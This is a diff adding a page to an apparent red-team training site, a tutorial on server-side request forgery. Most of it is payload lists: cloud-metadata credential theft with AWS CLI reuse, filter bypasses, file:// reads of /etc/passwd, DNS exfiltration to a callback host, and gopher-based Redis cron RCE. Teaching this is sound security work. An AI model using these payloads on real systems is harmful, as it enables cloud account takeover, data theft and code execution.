@@ -1,0 +1,166 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="SSRF — Red Team Academy"
+  module="Web Hacking"
+  tags={['ssrf', 'cloud-metadata', 'imds', 'filter-bypass', 'blind-ssrf']}
+  pageKey="web-ssrf"
+>
+  <h1>Server-Side Request Forgery (SSRF)</h1>
+  <p>SSRF tricks the server into making HTTP requests to attacker-specified destinations — reaching internal services, cloud metadata APIs, and loopback interfaces unreachable from the outside. In cloud environments, SSRF can yield IAM credentials leading to full account compromise.</p>
+
+  <h2>Basic SSRF Detection</h2>
+  <pre><code># Find parameters that accept URLs:
+?url=, ?link=, ?src=, ?path=, ?redirect=, ?image=, ?fetch=, ?load=, ?callback=
+
+# Test with your server (Burp Collaborator, interactsh):
+?url=http://BURP-COLLAB.burpcollaborator.net/test
+# If you get a DNS/HTTP hit → SSRF confirmed
+
+# Internal network probe:
+?url=http://127.0.0.1/
+?url=http://localhost/
+?url=http://0.0.0.0/
+?url=http://[::1]/       # IPv6 loopback
+
+# Port scan via SSRF (timing-based or error-based):
+?url=http://127.0.0.1:22    # SSH
+?url=http://127.0.0.1:3306  # MySQL
+?url=http://127.0.0.1:6379  # Redis
+?url=http://127.0.0.1:8080  # Internal admin
+?url=http://127.0.0.1:9200  # Elasticsearch</code></pre>
+
+  <h2>Cloud Metadata — AWS IMDSv1</h2>
+  <pre><code># AWS EC2 Instance Metadata Service (IMDSv1 — no token required):
+?url=http://169.254.169.254/latest/meta-data/
+?url=http://169.254.169.254/latest/meta-data/iam/
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns role name:
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+# Returns temporary AWS keys:
+# &#123; "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." &#125;
+
+# Use credentials with AWS CLI:
+AWS_ACCESS_KEY_ID=ASIA... \
+AWS_SECRET_ACCESS_KEY=... \
+AWS_SESSION_TOKEN=... \
+aws s3 ls
+
+# Other useful metadata endpoints:
+?url=http://169.254.169.254/latest/user-data              # startup scripts
+?url=http://169.254.169.254/latest/meta-data/hostname
+?url=http://169.254.169.254/latest/meta-data/public-keys/</code></pre>
+
+  <h2>Cloud Metadata — AWS IMDSv2 Bypass</h2>
+  <p>IMDSv2 requires a PUT request to get a token first. Some SSRF vulnerabilities support redirects or custom headers allowing IMDSv2 bypass.</p>
+  <pre><code># IMDSv2 requires PUT with X-aws-ec2-metadata-token-ttl-seconds header:
+# Step 1: Get token (requires PUT — only works if SSRF supports PUT or redirect):
+?url=http://169.254.169.254/latest/api/token
+# With: X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+# Step 2: Use token:
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# With: X-aws-ec2-metadata-token: TOKEN
+
+# Bypass via redirect:
+# If SSRF follows redirects, serve a redirect from your server:
+# GET /redirect → 301 to http://169.254.169.254/... with custom headers
+
+# Note: IMDSv2 doesn't protect against all SSRF — instance profile
+# actions can still be exploited if SSRF can send PUT</code></pre>
+
+  <h2>Cloud Metadata — GCP &amp; Azure</h2>
+  <pre><code># Google Cloud Platform (GCP):
+?url=http://metadata.google.internal/computeMetadata/v1/
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Requires header: Metadata-Flavor: Google
+# If SSRF allows custom headers: add Metadata-Flavor: Google
+
+# Microsoft Azure IMDS:
+?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
+# Requires header: Metadata: true
+
+# DigitalOcean:
+?url=http://169.254.169.254/metadata/v1/
+?url=http://169.254.169.254/metadata/v1/id
+?url=http://169.254.169.254/metadata/v1/user-data</code></pre>
+
+  <h2>SSRF Filter Bypass Techniques</h2>
+  <pre><code># IP notation alternatives for 127.0.0.1:
+http://0x7f000001/         # hex
+http://2130706433/         # decimal integer
+http://0177.0.0.1/         # octal
+http://127.1/              # shortened
+http://[::1]/              # IPv6
+http://[::ffff:127.0.0.1]/ # IPv4-mapped IPv6
+
+# Domain-based bypass:
+http://localtest.me/        # resolves to 127.0.0.1
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
+http://[::ffff:7f00:1]/
+
+# URL scheme abuse:
+file:///etc/passwd           # read local files
+dict://127.0.0.1:11211/stat  # Memcached interaction
+gopher://127.0.0.1:6379/_    # Redis interaction
+gopher://127.0.0.1:25/...    # SMTP interaction
+
+# Redirect bypass (if SSRF follows redirects):
+# Host a page that redirects to 169.254.169.254
+?url=https://your-server.com/redirect?to=http://169.254.169.254/
+
+# URL parser confusion:
+http://foo@169.254.169.254/  # some parsers use foo as host
+http://169.254.169.254#@target.com/
+http://169.254.169.254\target.com/
+
+# Protocol-relative:
+//169.254.169.254/metadata</code></pre>
+
+  <h2>Blind SSRF with DNS Callback</h2>
+  <pre><code># When no HTTP response returned but DNS requests are made:
+# Use interactsh or Burp Collaborator:
+
+# Setup interactsh:
+interactsh-client
+# Get your callback URL: xxxxxxxx.oast.live
+
+# Trigger DNS callback:
+?url=http://xxxxxxxx.oast.live/test
+
+# DNS-based data exfiltration (encode data in subdomain):
+# If SSRF can be chained to read internal data:
+?url=http://$(cat /etc/hostname).xxxxxxxx.oast.live/
+
+# Blind SSRF to internal services (error-based detection):
+?url=http://192.168.1.1:22    # TCP connect — timeout vs refused = different response
+?url=http://192.168.1.1:9999  # open vs closed port response time differs
+
+# Scan entire subnet via SSRF (use Burp Intruder with time tracking):
+?url=http://192.168.1.1/     # 1ms = closed
+?url=http://192.168.1.2/     # 5000ms = open (port filtered)
+?url=http://192.168.1.3/     # 2ms = closed</code></pre>
+
+  <h2>SSRF to Redis / Memcached RCE</h2>
+  <pre><code># Gopher protocol allows crafting raw TCP payloads:
+# Redis — write cron job for RCE (if Redis has no auth):
+gopher://127.0.0.1:6379/_MULTI%0d%0aSET%20/etc/cron.d/redis%20...
+
+# Or use gopherus to generate payloads:
+# https://github.com/tarunkant/Gopherus
+python gopherus.py --exploit redis
+python gopherus.py --exploit mysqld
+python gopherus.py --exploit fastcgi</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>PortSwigger SSRF labs — <code>portswigger.net/web-security/ssrf</code></li>
+    <li>PayloadsAllTheThings SSRF — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</code></li>
+    <li>interactsh — <code>github.com/projectdiscovery/interactsh</code></li>
+    <li>Gopherus — <code>github.com/tarunkant/Gopherus</code></li>
+    <li>SSRFmap — <code>github.com/swisskyrepo/SSRFmap</code></li>
+  </ul>
+</TrainingPage>
